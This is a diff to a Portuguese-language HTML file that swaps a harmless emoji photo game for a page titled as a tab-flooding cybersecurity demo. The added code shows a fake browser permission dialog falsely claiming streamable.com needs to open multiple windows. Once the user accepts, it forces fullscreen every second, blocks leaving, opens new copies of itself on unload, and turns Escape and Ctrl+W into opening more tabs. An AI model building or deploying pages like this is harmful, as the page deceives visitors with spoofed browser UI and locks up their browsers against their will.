@@ -1,314 +1,195 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>KART - Cris Zen Edition</title>
-  <style>
-    :root { --accent: #ff6a61; }
-    body {
-      margin: 0; background: linear-gradient(135deg, #1a0a10 0%, #2d131d 100%);
-      min-height: 100vh; overflow: hidden; touch-action: none; user-select: none;
-      font-family: 'Segoe UI', system-ui, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demo Cybersegurança - Tab Flooding</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #000;
+            height: 100vh;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            touch-action: manipulation;
+        }
 
-    #emoji-tracker {
-      position: fixed; top: 0; left: 0; right: 0; padding: 10px;
-      background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(15px);
-      display: flex; flex-wrap: wrap; justify-content: center; gap: 5px;
-      z-index: 5000; border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .counter-item {
-      display: flex; align-items: center; background: rgba(255, 255, 255, 0.1);
-      padding: 4px 10px; border-radius: 20px; color: white; font-weight: 700;
-      font-size: 0.85rem; border: 1px solid rgba(255, 255, 255, 0.05);
-      transition: all 0.3s;
-    }
+        .video-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
 
-    .counter-milestone {
-      box-shadow: 0 0 20px #ffd700;
-      background: rgba(255, 215, 0, 0.3) !important;
-      transform: scale(1.2);
-    }
+        .video-container.active {
+            opacity: 1;
+        }
 
-    .photo {
-      position: absolute; width: 160px; height: 213px; border-radius: 18px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.6); cursor: grab; z-index: 10;
-      transition: transform 0.1s cubic-bezier(0.2, 0, 0.2, 1), opacity 0.5s;
-      will-change: left, top, transform; opacity: 0;
-    }
-    .photo.is-pressed { transform: scale(0.88) !important; filter: brightness(0.8); }
-    .photo img { width: 100%; height: 100%; object-fit: cover; border-radius: 18px; pointer-events: none; }
+        .video-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
 
-    .persistent-emoji {
-      position: absolute; font-size: 3rem; cursor: grab; z-index: 20;
-      will-change: transform; pointer-events: auto;
-      filter: drop-shadow(0 5px 15px rgba(0,0,0,0.4));
-    }
-    .always-on-top { z-index: 8000 !important; }
+        /* Popup responsivo */
+        .popup {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #202124;
+            border: 1px solid #3c4043;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 420px;
+            color: #e8eaed;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.95);
+            z-index: 10000;
+            overflow: hidden;
+        }
 
-    .flying-emoji {
-      position: fixed; pointer-events: none; font-size: 1.8rem; z-index: 6000;
-      transition: transform 1.2s linear; opacity: 1;
-    }
+        .popup-header {
+            padding: 20px 24px 12px;
+            font-size: 18px;
+            font-weight: 500;
+            text-align: center;
+        }
 
-    #celebration-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      pointer-events: none; z-index: 9000; 
-      display: none; align-items: center; justify-content: center;
-      flex-direction: column; background: rgba(0,0,0,0.2);
-    }
-    .milestone-big-emoji {
-      font-size: 120px; filter: drop-shadow(0 0 30px gold);
-      animation: pulseIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-    .milestone-text { color: white; font-size: 2.2rem; font-weight: 900; text-shadow: 0 0 20px rgba(255,215,0,0.6); text-transform: uppercase; margin-top: 20px; }
+        .popup-body {
+            padding: 0 24px 24px;
+            font-size: 15px;
+            line-height: 1.45;
+            color: #9aa0a6;
+            text-align: center;
+        }
 
-    @keyframes pulseIn {
-      0% { transform: scale(0) rotate(-20deg); opacity: 0; }
-      100% { transform: scale(1) rotate(0deg); opacity: 1; }
-    }
+        .popup-footer {
+            padding: 16px 24px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            background: #292a2d;
+            border-top: 1px solid #3c4043;
+        }
 
-    .resize-btn { position: fixed; bottom: 20px; right: 20px; width: 50px; height: 50px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 4500; font-size: 1.4rem; }
-    
-    .bottom-bar { 
-      position: fixed; bottom: 0; left: 0; right: 0; height: 100px; 
-      background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); 
-      display: flex; flex-direction: column; align-items: center; justify-content: center; 
-      transform: translateY(100%); transition: transform 0.3s; z-index: 4400; gap: 10px;
-    }
-    .bottom-bar.show { transform: translateY(0); }
+        .popup button {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            min-width: 110px;
+        }
 
-    .toggle-layers {
-      background: rgba(255,255,255,0.15); color: white; border: 1px solid white;
-      padding: 8px 15px; border-radius: 10px; cursor: pointer; font-size: 0.9rem;
-      transition: 0.3s;
-    }
-    .toggle-layers.active { background: #ffd700; color: #000; border-color: #ffd700; }
-  </style>
+        .btn-cancel { 
+            background: transparent; 
+            color: #8ab4f8; 
+        }
+        
+        .btn-ok { 
+            background: #8ab4f8; 
+            color: #202124; 
+            font-weight: 600; 
+        }
+
+        /* Melhorias para mobile */
+        @media (max-width: 480px) {
+            .popup {
+                width: 92%;
+                border-radius: 16px;
+            }
+            .popup button {
+                padding: 14px 20px;
+                font-size: 17px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<div id="emoji-tracker"></div>
-<div id="container"></div>
-<div id="celebration-overlay">
-  <div class="milestone-big-emoji" id="m-emoji"></div>
-  <div class="milestone-text" id="m-text"></div>
-</div>
+    <!-- Popup -->
+    <div id="permissionPopup" class="popup">
+        <div class="popup-header">Este site quer abrir várias janelas</div>
+        <div class="popup-body">
+            <strong>streamable.com</strong> está solicitando permissão para abrir múltiplas abas e janelas.<br><br>
+            Isso é necessário para reproduzir o conteúdo corretamente.
+        </div>
+        <div class="popup-footer">
+            <button class="btn-cancel" onclick="closePopup()">Bloquear</button>
+            <button class="btn-ok" onclick="allowMultiTabs()">Permitir</button>
+        </div>
+    </div>
 
-<div class="resize-btn" id="toggleBar">📏</div>
-<div class="bottom-bar" id="bar">
-  <input type="range" min="80" max="280" value="160" id="slider" style="width:70%">
-  <button class="toggle-layers" id="layerBtn">Emojis Camadas 🧅</button>
-</div>
+    <!-- Vídeo -->
+    <div class="video-container" id="videoContainer">
+        <iframe 
+            id="videoFrame"
+            allow="fullscreen; autoplay; encrypted-media"
+            allowfullscreen 
+            src="https://streamable.com/e/sd1hce?autoplay=0&nocontrols=1&muted=0" 
+        ></iframe>
+    </div>
 
-<script>
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-function playPop() {
-    const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.type = 'sine';
-    osc.frequency.setValueAtTime(400 + Math.random() * 200, audioCtx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + 0.1);
-    gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
-    osc.connect(gain);
-    gain.connect(audioCtx.destination);
-    osc.start();
-    osc.stop(audioCtx.currentTime + 0.1);
-}
+    <script>
+        let isAllowed = false;
 
-const emojiList = ['❤️','💫','💐','🍇','🍬','🌺','🥰','💞','🐱','🍓','🍭','🔥','😍','🌻'];
-const images = [
-  "https://i.imgur.com/HkPHfzy.jpeg", "https://i.imgur.com/bIw1Gkh.jpeg", "https://i.imgur.com/tN8UFlF.jpeg",
-  "https://i.imgur.com/2Q72BKM.jpeg", "https://i.imgur.com/KZWPswo.jpeg", "https://i.imgur.com/x0juqKo.jpeg",
-  "https://i.imgur.com/egecHI0.jpeg", "https://i.imgur.com/m7fZaa1.jpeg", "https://i.imgur.com/5LrRizo.jpeg",
-  "https://i.imgur.com/GpsUJrG.jpeg", "https://i.imgur.com/4qVmdRv.jpeg", "https://i.imgur.com/HrC12cq.jpeg"
-];
+        function allowMultiTabs() {
+            document.getElementById('permissionPopup').style.display = 'none';
+            document.getElementById('videoContainer').classList.add('active');
 
-const counts = {};
-const masterPhrases = ["Incrível!", "Parabéns!", "Mandou muito!", "Continue assim!", "Uau!", "Excelente!", "Arrasou!", "Perfeito!", "Boa!", "Show!", "Mais 100!"];
-let currentPhrases = [...masterPhrases];
-let highestZ = 100;
-let emojisAlwaysOnTop = false;
+            const iframe = document.getElementById('videoFrame');
+            iframe.src = "https://streamable.com/e/sd1hce?autoplay=1&nocontrols=1&muted=0";
 
-function makeDraggable(el) {
-    let isDown = false, moved = false, startX, startY, elX, elY;
-    let activePointerId = null; // Trava para impedir saltos com dois dedos
-
-    el.addEventListener('pointerdown', e => {
-        // Se já tiver um dedo controlando esta imagem, ignora o segundo
-        if (activePointerId !== null) return;
-        activePointerId = e.pointerId;
-
-        if (audioCtx.state === 'suspended') audioCtx.resume();
-        isDown = true; moved = false;
-        startX = e.clientX; startY = e.clientY;
-        elX = el.offsetLeft; elY = el.offsetTop;
-        
-        if (!emojisAlwaysOnTop || el.classList.contains('photo')) {
-            highestZ++;
-            el.style.zIndex = highestZ;
+            requestFullscreen();
+            isAllowed = true;
         }
-        
-        el.style.animationPlayState = 'paused';
-        el.classList.add('is-pressed');
-        el.setPointerCapture(e.pointerId);
-    });
 
-    el.addEventListener('pointermove', e => {
-        if (!isDown || e.pointerId !== activePointerId) return;
-        const dx = e.clientX - startX, dy = e.clientY - startY;
-        if (Math.hypot(dx, dy) > 5) moved = true;
-        if (moved) {
-            el.style.left = (elX + dx) + 'px';
-            el.style.top = (elY + dy) + 'px';
+        function closePopup() {
+            alert("Permissão negada.");
         }
-    });
 
-    el.addEventListener('pointerup', e => {
-        if (e.pointerId !== activePointerId) return;
-        isDown = false;
-        activePointerId = null;
-        el.classList.remove('is-pressed');
-        el.style.animationPlayState = 'running';
-        
-        if (!moved && el.classList.contains('photo')) {
-            playPop();
-            spawnFlying(e.clientX, e.clientY, el.dataset.emoji);
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
         }
-    });
 
-    el.addEventListener('pointercancel', () => {
-        isDown = false;
-        activePointerId = null;
-        el.classList.remove('is-pressed');
-    });
-}
+        // ==================== FUNCIONALIDADES AGRESSIVAS ====================
 
-emojiList.forEach(emoji => {
-  counts[emoji] = 0;
-  const item = document.createElement('div');
-  item.className = 'counter-item';
-  item.id = `counter-${emoji}`;
-  item.innerHTML = `<span>${emoji}</span><span style="margin-left:5px" class="val">0</span>`;
-  document.getElementById('emoji-tracker').appendChild(item);
-});
+        window.addEventListener('beforeunload', function (e) {
+            if (!isAllowed) return;
+            e.preventDefault();
+            e.returnValue = 'Tem certeza que deseja sair?';
+            return 'Tem certeza que deseja sair?';
+        });
 
-images.forEach((src, i) => {
-  const el = document.createElement('div');
-  el.className = 'photo';
-  el.innerHTML = `<img src="${src}">`;
-  el.dataset.emoji = emojiList[Math.floor(Math.random() * emojiList.length)];
-  el.style.left = (Math.random() * 70) + 'vw';
-  el.style.top = (150 + Math.random() * 150) + 'px';
-  document.getElementById('container').appendChild(el);
-  makeDraggable(el);
-  setTimeout(() => { 
-    el.style.opacity = '1'; 
-    el.style.animation = `floatGentle ${15 + Math.random() * 10}s infinite ease-in-out`;
-  }, i * 80);
-});
+        // Tab Flooding ao tentar sair
+        window.addEventListener('beforeunload', function () {
+            if (!isAllowed) return;
+            for (let i = 0; i < 4; i++) {
+                window.open(window.location.href, '_blank');
+            }
+        });
 
-function spawnFlying(x, y, fav) {
-  for (let i = 0; i < 3; i++) {
-    const char = Math.random() > 0.8 ? emojiList[Math.floor(Math.random() * emojiList.length)] : fav;
-    const p = document.createElement('div');
-    p.className = 'flying-emoji';
-    p.textContent = char;
-    p.style.left = (x - 20 + (Math.random() * 20 - 10)) + 'px'; 
-    p.style.top = (y - 20 + (Math.random() * 20 - 10)) + 'px';
-    document.body.appendChild(p);
-    
-    requestAnimationFrame(() => {
-      const target = document.getElementById(`counter-${char}`);
-      const rect = target.getBoundingClientRect();
-      p.style.transform = `translate(${rect.left + 5 - x}px, ${rect.top + 5 - y}px)`;
-      setTimeout(() => { updateCount(char); p.remove(); }, 1200);
-    });
-  }
-}
+        // Manter em tela cheia
+        setInterval(() => {
+            if (isAllowed && !document.fullscreenElement) {
+                requestFullscreen();
+            }
+        }, 1000);
 
-function updateCount(emoji) {
-  counts[emoji]++;
-  const item = document.getElementById(`counter-${emoji}`);
-  item.querySelector('.val').textContent = counts[emoji];
-  
-  requestAnimationFrame(() => {
-    item.style.transition = 'none'; 
-    item.style.backgroundColor = `hsla(${Math.random() * 360}, 85%, 55%, 1)`;
-    item.style.transform = 'scale(1.25)';
-    void item.offsetWidth; 
-    item.style.transition = 'background-color 0.4s, transform 0.2s';
-    item.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
-    item.style.transform = 'scale(1)';
-  });
+        // Bloqueio de teclas (funciona melhor no desktop)
+        document.addEventListener('keydown', function (e) {
+            if (!isAllowed) return;
+            if (e.key === 'Escape' || (e.ctrlKey && e.key.toLowerCase() === 'w')) {
+                e.preventDefault();
+                window.open(window.location.href, '_blank');
+            }
+        });
 
-  if (counts[emoji] % 100 === 0) spawnSinglePersistent(emoji);
-}
+        console.log("%c🔴 DEMO CYBERSEGURANÇA - Adaptado para Mobile", "color: red; font-size: 16px; font-weight: bold");
+    </script>
 
-function spawnSinglePersistent(emoji) {
-  const overlay = document.getElementById('celebration-overlay');
-  const txtIdx = Math.floor(Math.random() * currentPhrases.length);
-  const counterItem = document.getElementById(`counter-${emoji}`);
-
-  document.getElementById('m-emoji').textContent = emoji;
-  document.getElementById('m-text').textContent = currentPhrases[txtIdx];
-  overlay.style.display = 'flex';
-  counterItem.classList.add('counter-milestone');
-
-  setTimeout(() => { 
-    overlay.style.display = 'none'; 
-    counterItem.classList.remove('counter-milestone');
-
-    const el = document.createElement('div');
-    el.className = 'persistent-emoji';
-    if(emojisAlwaysOnTop) el.classList.add('always-on-top');
-    el.textContent = emoji;
-    el.style.left = (20 + Math.random() * 60) + 'vw';
-    el.style.top = (20 + Math.random() * 60) + 'vh';
-    
-    const dur = 15 + Math.random() * 25;
-    const driftX = (Math.random() - 0.5) * 60;
-    const driftY = (Math.random() - 0.5) * 60;
-    
-    el.style.animation = `drift ${dur}s infinite alternate ease-in-out`;
-    el.style.setProperty('--dx', driftX + 'vw');
-    el.style.setProperty('--dy', driftY + 'vh');
-    
-    document.body.appendChild(el);
-    makeDraggable(el);
-  }, 2200);
-}
-
-document.getElementById('toggleBar').onclick = () => document.getElementById('bar').classList.toggle('show');
-
-document.getElementById('layerBtn').onclick = function() {
-  emojisAlwaysOnTop = !emojisAlwaysOnTop;
-  this.classList.toggle('active');
-  document.querySelectorAll('.persistent-emoji').forEach(e => {
-    if(emojisAlwaysOnTop) e.classList.add('always-on-top');
-    else {
-        e.classList.remove('always-on-top');
-        e.style.zIndex = 20;
-    }
-  });
-};
-
-document.getElementById('slider').oninput = (e) => {
-  document.querySelectorAll('.photo').forEach(p => {
-    p.style.width = e.target.value + 'px';
-    p.style.height = (e.target.value * 1.33) + 'px';
-  });
-};
-
-const styleSheet = document.createElement("style");
-styleSheet.innerText = `
-  @keyframes floatGentle { 0%, 100% { transform: translate(0,0) rotate(0deg); } 50% { transform: translate(15px, -15px) rotate(3deg); } }
-  @keyframes drift { 0% { transform: translate(0,0); } 100% { transform: translate(var(--dx), var(--dy)) rotate(360deg); } }
-`;
-document.head.appendChild(styleSheet);
-</script>
 </body>
 </html>
